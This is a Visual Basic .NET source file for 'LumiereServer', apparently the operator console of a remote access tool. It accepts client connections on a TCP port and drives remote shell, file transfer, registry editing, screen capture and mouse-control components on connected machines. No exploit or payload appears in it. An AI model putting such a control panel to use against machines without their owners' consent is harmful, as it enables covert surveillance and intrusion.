Imports System.ComponentModel

Imports System.Threading
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Collections.Concurrent
Imports ServerCore
Imports System.Text.RegularExpressions

Public Class LumiereServer
    Dim tcpListener As TcpListener
    Dim usersManager As UsersManager
    Dim report As Reporting = Reporting.GetInstance()

    Dim userController As UserInfoController
    Dim ftpController As FtpController
    Dim shellController As ShellController
    Dim videoController As VideoController
    Dim mouseController As MouseController
    Dim ftpDownloadController As FtpDownloadController
    Dim ftpUploadController As FtpUploadController
    Dim regeditController As RegeditController

    Private Async Sub LumiereServer_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        InitializeControls()

        usersManager = UsersManager.GetInstance()
        usersManager.OnComponentInit = AddressOf EventComponentInit
        usersManager.OnComponentUnInit = AddressOf EventComponentUnInit
        usersManager.OnComponentDisconnect = AddressOf EventComponentDisconnect
        usersManager.OnNewUser = AddressOf EventNewUser
        usersManager.OnUserDisconnect = AddressOf EventUserDisconnect
        usersManager.OnSelectedUserDisconnect = AddressOf EventSelectedUserDisconnect
        usersManager.OnReceiveCallback = AddressOf EventReceive
        usersManager.OnSelectedUserStoppedProcessing = AddressOf EventSelectedUserStoppedProcessing

        BasicController.SetViewer(Me)
        UserInfoController.StartupInit()
        FtpController.StartupInit()
        ShellController.StartupInit()
        VideoController.StartupInit()
        FtpDownloadController.StartupInit()
        FtpUploadController.StartupInit()
        RegeditController.StartupInit()

        tcpListener = New TcpListener(IPAddress.Any, 43100)
        tcpListener.Start()

        '' Wait for new connections
        While True
            Dim acceptedClient As TcpClient
            Dim component As ComponentInstance

            Try
                acceptedClient = Await tcpListener.AcceptTcpClientAsync()
                component = New ComponentInstance(acceptedClient)
            Catch ex As Exception
                report.High("server threw exception: " + ex.Message, True)
                Continue While
            End Try

            Try
                If Await component.Authentificate() Then
                    Dim user As UserWrapper = usersManager.AddNewComponent(component)
                    report.High("client " + user.Descriptor.userName + " of type " + component.ComponentType.ToString() + " has been accepted!", False)
                Else
                    report.High("socket " + component.Address + " failed to authentificate!", True)
                End If
            Catch ex As Exception
                '' Close just in case the core functions do not
                component.CloseClient()

                report.High(ex.Message, True)
            End Try
        End While
    End Sub
    Private Sub InitializeControls()
        btnForce1.Tag = ComponentTypes.shell
        btnForce2.Tag = ComponentTypes.ftp
        btnForce3.Tag = ComponentTypes.upload_manager
        btnForce4.Tag = ComponentTypes.download_manager
        btnForce5.Tag = ComponentTypes.regedit
        btnForce6.Tag = ComponentTypes.screenCapture
        btnForce7.Tag = ComponentTypes.mouse

        Dim forceButtons As List(Of Button) = New List(Of Button) From {btnForce1, btnForce2, btnForce3, btnForce4, btnForce5, btnForce6, btnForce7}
        forceButtons.ForEach(Sub(obj)
                                 AddHandler obj.Click, AddressOf btnForceX_Click
                             End Sub)
    End Sub



    Private Async Function EventComponentInit(user As UserWrapper, component As ComponentInstance, cancellationToken As CancellationToken) As Task
        Select Case component.ComponentType
            Case ComponentTypes.ftp
                ftpController = New FtpController(user, cancellationToken)
                Await ftpController.Init()
            Case ComponentTypes.shell
                shellController = New ShellController(user, cancellationToken)
                Await shellController.Init()
            Case ComponentTypes.screenCapture
                videoController = New VideoController(user, cancellationToken)
                Await videoController.Init()
            Case ComponentTypes.mouse
                mouseController = New MouseController(user, cancellationToken)
                Await mouseController.Init()
            Case ComponentTypes.download_manager
                ftpDownloadController = New FtpDownloadController(user, cancellationToken)
                Await ftpDownloadController.Init()
            Case ComponentTypes.upload_manager
                ftpUploadController = New FtpUploadController(user, cancellationToken)
                Await ftpUploadController.Init()
            Case ComponentTypes.regedit
                regeditController = New RegeditController(user, cancellationToken)
                Await regeditController.Init()
        End Select
    End Function
    Private Async Function EventComponentUnInit(user As UserWrapper, component As ComponentInstance) As Task
        '' All controllers must be set to Nothing after destruction because other components may query wether 
        '' a controller is usable aka <>Nothing and use it (for eg. video with mouse)
        Select Case component.ComponentType
            Case ComponentTypes.ftp
                Await ftpController.Wait()
                Await ftpController.UnInit()
                ftpController = Nothing
            Case ComponentTypes.download_manager
                Await ftpDownloadController.Wait()
                Await ftpDownloadController.UnInit()
                ftpDownloadController = Nothing
            Case ComponentTypes.upload_manager
                Await ftpUploadController.Wait()
                Await ftpUploadController.UnInit()
                ftpUploadController = Nothing
            Case ComponentTypes.shell
                Await shellController.Wait()
                Await shellController.UnInit()
                shellController = Nothing
            Case ComponentTypes.screenCapture
                Await videoController.Wait()
                Await videoController.UnInit()
                videoController = Nothing
            Case ComponentTypes.mouse
                Await mouseController.Wait()
                Await mouseController.UnInit()
                mouseController = Nothing
            Case ComponentTypes.regedit
                Await regeditController.Wait()
                Await regeditController.UnInit()
                regeditController = Nothing
        End Select
    End Function

    Private Sub EventNewUser(user As UserWrapper)
        clientList.Items.Add(New UsersListItem() With {.systemId = user.SystemId, .userName = user.Descriptor.userName})
    End Sub
    Private Sub EventComponentDisconnect(user As UserWrapper, component As ComponentInstance)
        report.High("client " + user.Descriptor.userName + " of type " + component.ComponentType.ToString() + " has been disconnected!", True)
    End Sub
    Private Sub EventUserDisconnect(user As UserWrapper)
        clientList.Items.Remove(New UsersListItem() With {.systemId = user.SystemId})
    End Sub
    Private Sub EventSelectedUserDisconnect()
        userController.UnInit()
    End Sub
    Private Sub EventSelectedUserStoppedProcessing()
        userController.UnInit()
    End Sub
    Private Async Function EventReceive(user As UserWrapper, component As ComponentInstance, packet As StructurePacketHeader, token As TokenSecurity) As Task
        Select Case component.ComponentType
            Case ComponentTypes.ftp
                Await ftpController.HandlePacket(user, packet, token)
            Case ComponentTypes.shell
                Await shellController.HandlePacket(user, packet, token)
            Case ComponentTypes.screenCapture
                Await videoController.HandlePacket(user, packet, token)
            Case ComponentTypes.mouse
                Await mouseController.HandlePacket(user, packet, token)
            Case ComponentTypes.download_manager
                Await ftpDownloadController.HandlePacket(user, packet, token)
            Case ComponentTypes.upload_manager
                Await ftpUploadController.HandlePacket(user, packet, token)
            Case ComponentTypes.regedit
                Await regeditController.HandlePacket(user, packet, token)
        End Select
    End Function


    ''' <summary>
    ''' Get a initialized controller for inter-controller communication
    ''' </summary>
    ''' <returns></returns>
    Public Function GetController(componentType As ComponentTypes) As BasicController
        Dim result As BasicController = Nothing

        Select Case componentType
            Case ComponentTypes.ftp
                result = ftpController
            Case ComponentTypes.shell
                result = shellController
            Case ComponentTypes.screenCapture
                result = videoController
            Case ComponentTypes.mouse
                result = mouseController
            Case ComponentTypes.download_manager
                result = ftpDownloadController
        End Select
        Return result
    End Function


#Region "UsersPanelEvents"
    Private Async Sub clientList_DoubleClick(sender As Object, e As EventArgs) Handles clientList.DoubleClick
        If clientList.SelectedItem Is Nothing Then
            Return
        End If

        Dim selectedUser As UsersListItem = DirectCast(clientList.SelectedItem, UsersListItem)
        If Await usersManager.SwitchUser(selectedUser.systemId) Then
            If userController IsNot Nothing Then
                Await userController.UnInit()
            End If

            userController = New UserInfoController(usersManager.GetCurrentUser())
            Await userController.Init()

            '' Switch back to user info tab
            clientsControlBoard.SelectedTab = clientInfoTab
        End If
    End Sub
#End Region

    Private Sub SchedulerTimer_Tick(sender As Object, e As EventArgs) Handles ReportingTimer.Tick
        '' Reporting errors and notifications
        Dim prefixSymbol As String

        For Each entry In report.Read(False)
            '' We must move the cursor at the end or the coloring will
            '' be applied wherever the user se the cursor
            debugView.SelectionStart = debugView.TextLength

            If entry.Item1 Then
                debugView.SelectionColor = Color.LightGreen
                prefixSymbol = "[!]"
            Else
                debugView.SelectionColor = Color.White
                prefixSymbol = "[+]"
            End If

            debugView.AppendText(prefixSymbol + " " + entry.Item2 + vbNewLine)
        Next

        For Each entry In report.Read(True)
            '' We must move the cursor at the end or the coloring will
            '' be applied wherever the user se the cursor
            debugLowLevelView.SelectionStart = debugLowLevelView.TextLength

            If entry.Item1 Then
                debugLowLevelView.SelectionColor = Color.Red
                prefixSymbol = "[!]"
            Else
                debugLowLevelView.SelectionColor = Color.LightGreen
                prefixSymbol = "[+]"
            End If

            debugLowLevelView.AppendText(prefixSymbol + " " + entry.Item2 + vbNewLine)
        Next

    End Sub

    Private Sub PingingTimer_Tick(sender As Object, e As EventArgs) Handles PingingTimer.Tick
        usersManager.PingUsers()
    End Sub

    Private Sub btnDestroy_Click(sender As Object, e As EventArgs) Handles btnDestroy.Click
        Dim selectedUser As UserWrapper = usersManager.GetCurrentUser()
        If selectedUser Is Nothing Then
            Return
        End If

        selectedUser.CloseUser()
    End Sub

    Private Async Sub btnSwitchOut_Click(sender As Object, e As EventArgs) Handles btnSwitchOut.Click
        '' Testing code
        Await usersManager.SwitchUser("")
        Debug.WriteLine("Finished switching")
    End Sub

    Private Async Sub btnForceX_Click(sender As Object, e As EventArgs)
        Dim selectedUser As UserWrapper = usersManager.GetCurrentUser()
        If selectedUser Is Nothing Then
            Return
        End If

        Dim type As ComponentTypes = DirectCast(sender, Button).Tag
        Await selectedUser.ForceLoadComponent(type)
    End Sub
End Class